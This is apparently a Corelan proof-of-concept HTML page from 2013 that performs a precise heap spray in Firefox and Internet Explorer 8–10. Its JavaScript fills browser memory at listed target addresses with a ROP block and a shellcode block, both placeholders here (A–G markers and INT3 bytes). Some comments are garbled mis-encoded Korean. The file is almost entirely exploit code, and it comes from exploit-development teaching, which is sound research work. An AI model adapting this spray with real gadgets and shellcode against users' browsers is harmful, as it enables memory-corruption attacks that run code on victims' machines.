<!-- Corelan "DEPS" - Precise heap spray for FF/IE8/IE9/IE10 â€“ corelanc0d3r
www.corelan.be 2013 -->
<html><head></head>
<body>
<div id="blah"></div>
<script language = 'javascript'>
	var div_container = document.getElementById("blah");
	div_container.style.cssText = "display:none";
	var data;
	offset = 0x104; // shellcode offset Á¶Àý
	junk = unescape("%u2020%u2020");

	while (junk.length < 0x1000) 
	{
		junk += junk;
	}

	rop = unescape("%u4141%u4141%u4242%u4242%u4343%u4343%u4444%u4444%u4545%u4545%u4646%u4646%u4747%u4747");
	shellcode = unescape("%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc");
	data = junk.substring(0,offset) + rop + shellcode
	data += junk.substring(0,0x800-offset-rop.length-shellcode.length);
	
	while (data.length < 0x80000) 
	{
		data += data;
	}
	// Targets:
	// FireFox : 0x20302210
	// IE 8, 9 and 10 : 0x20302228
	for (var i = 0; i < 0x250; i++)
	{
		var obj = document.createElement("button");
		obj.title = data.substring(0,0x40000-0x58); // ÈüÇÒ´ç
		obj.style.fontFamily = data.substring(0,0x40000-0x58); // ÈüÇÒ´ç
		div_container.appendChild(obj); // Èü °íÁ¤ÇÒ´ç
	}
	alert("spray done");
</script>
</body>
</html>
